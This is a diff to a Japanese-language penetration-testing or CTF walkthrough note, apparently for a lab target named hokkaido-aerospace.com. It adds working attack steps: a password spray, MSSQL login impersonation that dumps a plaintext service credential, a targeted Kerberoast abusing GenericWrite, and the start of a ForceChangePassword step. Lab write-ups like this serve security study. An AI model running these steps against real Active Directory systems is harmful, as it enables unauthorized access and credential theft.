@@ -25,7 +25,26 @@ smbmap -u info -p info -H hokkaido-aerospace.com
 kerbrute passwordspray --dc <DC_IP> -d <domain> <username wordlist> '<pw>'
 ```
 
-6. MSSQLにログイン
+6. MSSQLにログインし、なりすまし可能なユーザーを探索し、なりすましてデータベースにアクセスした結果、新たな認証情報を入手
 ```sh
-
+impacket-mssqlclient hokkaido-aerospace.com/discovery@$TargetIP -port 1433 -windows-auth
 ```
+```sql
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
+
+EXECUTE AS LOGIN = 'hrappdb-reader';
+
+USE hrappdb;
+
+SQL (hrappdb-reader  hrappdb-reader@hrappdb)> SELECT * FROM sysauth;
+id   name               password           
+--   ----------------   ----------------   
+ 0   b'hrapp-service'   b'Untimed$Runny'   
+```
+
+7. 入手した認証情報は、ほかユーザーオブジェクトに対して `GenericWrite` をもっていたため、 Targeted Kerberoast を実行（[[💥AD Exploit#Targeted Kerberoast]]）
+```sh
+python3 targetedKerberoast.py -v -d '<domain>' -u '<username>' -p '<pw>'
+```
+
+8. Kerberoastして侵害したユーザーが、ほかユーザーオブジェクトに対してForceChangePassword ACEをもっていたため、パスワードを変更（[[💥AD Exploit#ForceChangePassword]]
